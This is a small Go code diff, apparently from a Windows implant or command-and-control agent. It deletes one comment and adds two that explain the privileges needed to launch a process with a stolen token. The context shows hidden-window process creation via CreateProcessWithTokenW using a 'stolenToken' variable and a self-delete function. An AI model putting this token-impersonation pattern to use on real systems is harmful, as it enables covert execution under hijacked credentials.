@@ -32,7 +32,6 @@ func DeleteSelfImpl() {
 	}
 }
 
-// maybe need to be checked
 func listDrivesImpl(b []byte) error {
 	bitMask, err := windows.GetLogicalDrives()
 	if err != nil {
@@ -288,6 +287,8 @@ func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *win
 	// force create no window
 	creationFlags = creationFlags | windows.CREATE_NO_WINDOW
 	if !ignoreToken && isTokenValid {
+		// SeImpersonatePrivilege to make CreateProcessWithToken()
+		// or SeAssignPrimaryTokenPrivilege to use CreateProcessAsUser()
 		_, _, err := createProcessWithTokenW.Call(uintptr(stolenToken), LOGON_WITH_PROFILE, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)))
 		if err != nil && err != windows.SEVERITY_SUCCESS {
 			if err != windows.ERROR_PRIVILEGE_NOT_HELD {
